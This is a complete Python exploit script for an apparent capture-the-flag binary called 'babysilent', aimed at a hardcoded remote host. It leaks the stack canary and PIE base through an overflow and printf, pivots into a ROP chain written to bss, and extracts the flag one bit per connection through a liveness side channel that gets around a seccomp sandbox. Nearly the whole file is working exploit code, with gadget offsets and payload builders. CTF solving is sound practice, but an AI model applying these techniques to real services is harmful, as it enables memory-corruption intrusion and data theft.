#!/usr/bin/env python3
"""
babysilent - final exploit.

pwn:  main() reads size<=0x88 into a 0x58 stack buffer, prints it with %s,
      then reads it again, sleeps 1s, blind()s (close 1,2 + seccomp allow
      read/exit/exit_group only) and returns.  fd 3 is already the flag.

Stage 1 (one printf leaks both secrets)
      Input 89 bytes: 88 filler + one non-zero byte over the canary LSB.
      printf("%s") runs past the canary (LSB 0x00) and prints canary[1..7],
      then main's saved rbp which main overwrote with rcx == PIE+0x2005a0.
      leak len == 103  ->  canary = 0x00||d[89:96], PIE = d[96:102]-0x2005a0.

Stage 2 (4 qwords -> arbitrary line write into bss page)
      saved rbp = CHAIN-8 ; ret = pop rdi;CHAIN ; get_input ; leave;ret
      get_input(CHAIN, 0xffffa490) writes our long ROP chain into bss at 0x601100.

Stage 3 (oracle, 1 bit per connection)
      chain: read(3, B, 1) x (k+1)   -> dword[B] = flag[k] (upper bytes zero)
             atoi("guess") -> eax
             rbp = B+0x1c ; jmp cmp dword [rbp-0x1c], eax ; ja <read loop>
      "flag[k] > guess":
          enters get_input's byte loop with buf = B, size = flag[k].  The bytes
          we feed are 0xff... which rewrite the size dword itself, making it
          0xffffffff, and rewrite the buf pointer to B, and rewrite the loop
          counter i back to 0 every 16 iterations -> the loop runs forever and
          keeps eating stdin  => child stays ALIVE.
      otherwise: no reads, canary ok, pivot -> exit@plt  => child DIES.
      The platform's tcp front-end does not forward EOF, so death is detected
      by pushing pattern bytes until send fails (EPIPE) - the wrapper's next
      pipe write fails as soon as the child is gone.
"""
import sys, os, time, socket, subprocess, threading, queue, struct


def u64(b):
    return struct.unpack('<Q', b[:8].ljust(8, b'\x00'))[0]


def p64(x):
    return struct.pack('<Q', x)

HOST, PORT = '123.57.250.177', 32828
LOCAL_DIR = '/root/ctf/babysilent/local'

OFF_POP_RDI   = 0x200603
OFF_POP_RBP   = 0x200180
OFF_LEAVE_RET = 0x2002b9
OFF_CSU_POP   = 0x2005fa
OFF_CSU_CALL  = 0x2005e0
OFF_GET_INPUT = 0x20031c
OFF_CMP_JMP   = 0x20038b
OFF_READ_PLT  = 0x2000b0
OFF_ATOI_PLT  = 0x2000e0
OFF_EXIT_PLT  = 0x2000f0
OFF_READ_GOT  = 0x600fa8
OFF_SAVED_RBP = 0x2005a0
CHAIN_OFF     = 0x601100

SLEEP_WAIT = 1.45
CHUNK = 4096


def bad(b):
    return b'\n' in b


class Conn:
    def __init__(self, mode, host, port):
        if mode == 'local':
            a, b = socket.socketpair()
            self.s = a
            self.proc = subprocess.Popen(['./wrapper'], cwd=LOCAL_DIR,
                                         stdin=b, stdout=b, stderr=b)
            b.close()
        else:
            self.s = socket.create_connection((host, port), timeout=8)
            self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            try:
                self.s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2048)
            except Exception:
                pass
            self.proc = None
        self.s.settimeout(6)

    def send(self, d):
        self.s.sendall(d)

    def recvuntil(self, tok, timeout=6):
        self.s.settimeout(timeout)
        buf = b''
        while tok not in buf:
            try:
                c = self.s.recv(1)
            except socket.timeout:
                raise EOFError('timeout waiting %r got %r' % (tok, buf))
            if not c:
                raise EOFError('eof waiting %r got %r' % (tok, buf))
            buf += c
        return buf

    def push_pattern(self, pattern, budget=64 * 1024, deadline=1.8):
        """send pattern chunks until peer is gone; True == dead"""
        blk = (pattern * (CHUNK // len(pattern) + 1))[:CHUNK]
        t_end = time.time() + deadline
        sent = 0
        self.s.setblocking(False)
        try:
            while sent < budget and time.time() < t_end:
                try:
                    sent += self.s.send(blk)
                except BlockingIOError:
                    pass
                except (BrokenPipeError, ConnectionResetError, OSError):
                    return True
                time.sleep(0.003)
        finally:
            try:
                self.s.setblocking(True)
            except Exception:
                pass
        try:
            self.s.settimeout(0.05)
            if self.s.recv(64) == b'':
                return True
        except socket.timeout:
            pass
        except (ConnectionResetError, BrokenPipeError, OSError):
            return True
        return False

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass
        if self.proc:
            try:
                self.proc.kill(); self.proc.wait()
            except Exception:
                pass


def do_leak(p):
    p.recvuntil(b'size: ')
    p.send(b'136\n')
    p.recvuntil(b'> ')
    p.send(b'A' * 89 + b'\n')
    p.recvuntil(b'Your name is: ')
    tail = b'Now you have 1 choice to change your name.\n'
    p.s.settimeout(6)
    buf = b''
    while not buf.endswith(tail):
        c = p.s.recv(1)
        if not c:
            raise EOFError('eof in leak')
        buf += c
        if len(buf) > 300:
            raise EOFError('leak too long')
    return buf[:-len(tail)]


def build(pie, k, guess, canary):
    chain = pie + CHAIN_OFF
    gstr = str(guess).encode() + b'\x00'
    island_off = (15 + k + 6) * 8
    B = chain + island_off
    guess_str = B + 0x2c
    c = b''
    c += p64(pie + OFF_CSU_POP)
    c += p64(0) + p64(1) + p64(pie + OFF_READ_GOT) + p64(3) + p64(B) + p64(1)
    c += p64(pie + OFF_CSU_CALL)
    c += p64(0) + b'\x00' * 48
    c += p64(pie + OFF_READ_PLT) * k
    c += p64(pie + OFF_POP_RDI) + p64(guess_str) + p64(pie + OFF_ATOI_PLT)
    c += p64(pie + OFF_POP_RBP) + p64(B + 0x1c) + p64(pie + OFF_CMP_JMP)
    assert len(c) == island_off
    isl = bytearray(0x2c + len(gstr))
    isl[0x00:0x04] = b'\x00' * 4              # size dword  <- flag byte
    isl[0x04:0x0c] = p64(B)                   # buf = size dword itself
    isl[0x0f] = 0
    isl[0x10:0x14] = b'\x00' * 4              # i = 0
    isl[0x14:0x1c] = canary
    isl[0x1c:0x24] = p64(0)
    isl[0x24:0x2c] = p64(pie + OFF_EXIT_PLT)  # "no" branch
    isl[0x2c:0x2c + len(gstr)] = gstr
    payload = c + bytes(isl)
    # 17-byte start then 16-byte cycle: ff*3 | p64(B) | junk | 0x00(reset i)
    pattern = b'\xff' * 3 + p64(B) + b'\x00' * 4 + b'\x00'
    assert len(pattern) == 16
    stream = b'\xff' + pattern * 96
    return payload, B, pattern, stream


def oracle(k, guess, mode, host, port, retries=8):
    last = None
    for _ in range(retries):
        p = None
        try:
            p = Conn(mode, host, port)
            data = do_leak(p)
            if len(data) != 103:
                raise EOFError('bad leak len %d' % len(data))
            canary = b'\x00' + data[89:96]
            pie = u64(data[96:102].ljust(8, b'\x00')) - OFF_SAVED_RBP
            if pie & 0xfff or pie < 0x1000:
                raise EOFError('bad pie %#x' % pie)
            ca = pie + CHAIN_OFF
            payload, B, pattern, stream = build(pie, k, guess, canary)
            pay = (b'A' * 88 + canary + p64(ca - 8) + p64(pie + OFF_POP_RDI) +
                   p64(ca) + p64(pie + OFF_GET_INPUT) + p64(pie + OFF_LEAVE_RET))
            assert len(pay) == 136
            if bad(pay) or bad(payload):
                raise EOFError('newline in payload')
            p.send(pay)
            p.send(payload + b'\n')
            p.send(stream)
            time.sleep(SLEEP_WAIT)
            dead = p.push_pattern(pattern)
            p.close()
            return not dead
        except Exception as e:
            last = e
            if p:
                p.close()
            continue
    raise RuntimeError('oracle k=%d g=%d failed: %r' % (k, guess, last))


def get_byte(k, mode, host, port):
    lo, hi = 0, 0xff
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(k, mid, mode, host, port):
            lo = mid + 1
        else:
            hi = mid
    return lo


def worker(tasks, out, mode, host, port):
    while True:
        try:
            k = tasks.get_nowait()
        except queue.Empty:
            return
        try:
            v = get_byte(k, mode, host, port)
            out[k] = v
            print('[k=%02d] %d %r' % (k, v, chr(v) if 32 <= v < 127 else '.'), flush=True)
        except Exception as e:
            print('[k=%02d] FAILED %r' % (k, e), flush=True)
            out[k] = None


def main():
    args = sys.argv[1:]
    mode, host, port = 'remote', HOST, PORT
    nbytes, nthreads, only = 64, 6, None
    for a in args:
        if a in ('local', 'remote'):
            mode = a
        elif a.startswith('-n'):
            nbytes = int(a[2:])
        elif a.startswith('-t'):
            nthreads = int(a[2:])
        elif a.startswith('-k'):
            only = [int(x) for x in a[2:].split(',')]
        elif ':' in a:
            host, port = a.split(':'); port = int(port)
    t0 = time.time()
    ks = only if only else list(range(nbytes))
    tasks = queue.Queue()
    for k in ks:
        tasks.put(k)
    out = {}
    ths = [threading.Thread(target=worker, args=(tasks, out, mode, host, port)) for _ in range(nthreads)]
    for t in ths: t.start()
    for t in ths: t.join()
    res = bytes([out[k] for k in ks if out.get(k) is not None])
    print('\nTIME %.1fs' % (time.time() - t0))
    print('BYTES: %r' % res)
    print('TEXT : %s' % res.decode('latin1'))


if __name__ == '__main__':
    main()
